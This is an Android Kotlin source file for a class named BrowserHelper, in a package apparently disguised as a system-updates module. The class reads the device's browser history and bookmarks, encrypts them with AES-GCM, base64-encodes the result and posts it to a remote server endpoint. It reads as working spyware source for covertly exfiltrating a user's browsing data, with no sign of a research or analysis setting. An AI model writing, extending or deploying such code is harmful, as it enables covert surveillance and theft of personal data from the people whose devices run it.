package com.system.updates.modules.network

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.Browser
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetworkUtils
import org.json.JSONArray
import org.json.JSONObject
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class BrowserHelper(private val context: Context) {
    private val TAG = "BrowserHelper"
    private val cryptoManager = CryptoManager(context)
    private val networkUtils = NetworkUtils(context)

    fun collectBrowserData(): JSONObject {
        val result = JSONObject()
        try {
            if (checkPermission()) {
                result.put("history", getHistory())
                result.put("bookmarks", getBookmarks())
            } else {
                Log.w(TAG, "No permission to read browser data")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting browser data: ${e.message}")
        }
        return result
    }

    private fun checkPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_HISTORY_BOOKMARKS) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    private fun getHistory(): JSONArray {
        val history = JSONArray()
        val uri = Uri.parse("content://browser/bookmarks")
        val projection = arrayOf(Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.VISITS)
        val selection = "${Browser.BookmarkColumns.BOOKMARK} = 0"
        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(uri, projection, selection, null, null)
            cursor?.use {
                val titleIdx = it.getColumnIndex(Browser.BookmarkColumns.TITLE)
                val urlIdx = it.getColumnIndex(Browser.BookmarkColumns.URL)
                while (it.moveToNext()) {
                    val obj = JSONObject()
                    obj.put("title", it.getString(titleIdx) ?: "")
                    obj.put("url", it.getString(urlIdx) ?: "")
                    history.put(obj)
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "SecurityException: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Error: ${e.message}")
        } finally {
            cursor?.close()
        }
        return history
    }

    private fun getBookmarks(): JSONArray {
        val bookmarks = JSONArray()
        val uri = Uri.parse("content://browser/bookmarks")
        val projection = arrayOf(Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL)
        val selection = "${Browser.BookmarkColumns.BOOKMARK} = 1"
        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(uri, projection, selection, null, null)
            cursor?.use {
                val titleIdx = it.getColumnIndex(Browser.BookmarkColumns.TITLE)
                val urlIdx = it.getColumnIndex(Browser.BookmarkColumns.URL)
                while (it.moveToNext()) {
                    val obj = JSONObject()
                    obj.put("title", it.getString(titleIdx) ?: "")
                    obj.put("url", it.getString(urlIdx) ?: "")
                    bookmarks.put(obj)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error: ${e.message}")
        } finally {
            cursor?.close()
        }
        return bookmarks
    }

    fun sendCollectedData() {
        val data = collectBrowserData()
        if (data.length() == 0) return
        val jsonStr = data.toString()
        val key = cryptoManager.deriveDeviceKey()
        val iv = ByteArray(12).also { SecureRandom().nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key, "AES"), GCMParameterSpec(128, iv))
        val encrypted = cipher.doFinal(jsonStr.toByteArray())
        val full = iv + encrypted
        val b64 = Base64.encodeToString(full, Base64.NO_WRAP)
        networkUtils.httpPost(networkUtils.getBaseUrl() + "/api/v1/browser", "data=$b64")
    }
}